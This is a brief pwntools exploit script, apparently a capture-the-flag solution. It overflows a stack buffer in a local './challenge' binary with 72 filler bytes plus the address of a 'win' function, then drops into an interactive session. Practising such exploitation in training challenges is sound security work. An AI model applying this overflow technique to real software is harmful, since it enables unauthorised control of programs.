from pwn import *

elf = ELF("./challenge")
win_addr = elf.symbols["win"]
log.info(f"win() is at {hex(win_addr)}")

p = process("./challenge")
payload = b"A" * 72 + p64(win_addr)
p.sendafter(b"name: ", payload)
p.interactive()
